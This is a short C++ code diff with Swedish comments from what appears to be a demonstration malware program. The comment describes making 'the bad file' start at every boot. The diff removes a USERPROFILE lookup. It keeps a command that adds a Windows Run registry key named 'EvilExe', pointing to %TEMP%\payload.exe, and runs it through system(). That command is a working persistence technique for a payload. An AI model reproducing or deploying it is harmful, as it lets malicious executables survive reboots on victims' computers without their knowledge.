@@ -41,12 +41,6 @@ int main() {
 
     //exempel på hur vi kan implementera att den dåliga filen startas varje gång datorn startar, genom att lägga till en registernyckel
     try {
-        char* userProfile = getenv("USERPROFILE");
-        if (!userProfile) {
-            cerr << "USERPROFILE kan inte hittas\n";
-            return 1;
-        }
-
         string regCommand = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v EvilExe /t REG_SZ /d \"%TEMP%\\payload.exe\" /f";
         system(regCommand.c_str());
 
